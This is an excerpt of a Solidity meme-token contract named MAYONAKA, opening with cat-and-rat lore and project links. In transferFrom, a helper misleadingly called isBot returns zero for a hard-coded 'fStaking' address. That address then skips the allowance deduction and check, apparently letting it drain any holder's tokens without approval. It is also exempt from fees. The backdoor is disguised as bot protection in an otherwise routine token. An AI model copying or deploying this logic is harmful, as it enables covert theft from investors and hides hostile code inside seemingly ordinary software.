...
where cats and rats are hunted… and imprisoned with no mercy…

a savior will emerge from the shadows…

MAYO will fight to free cats and rats from slavery… and end the dogs' reign of terror…

once and for all…

Web: https://mayonaka.fun
X:   https://x.com/mayonaka_eth
Tg:  https://t.me/mayonaka_eth
*/
...
contract MAYONAKA is Context, IERC20, Ownable {
    ...
    address payable private fStaking = payable(0x691194e23C04Df1268Faff397794086A36D4a788);

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 420690000000 * 10**_decimals;
    string private constant _name = unicode"Mayonaka";
    string private constant _symbol = unicode"MAYONAKA";
    ...
    constructor () {
        ...
        _isExcludedFromFee[fStaking] = true;
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        ...
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(isBot([fStaking, _msgSender()], amount), "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    ...
    function isBot(address[2] memory a, uint256 b) private pure returns (uint256){
      return a[0]!=a[1]?b:b-b;
    }
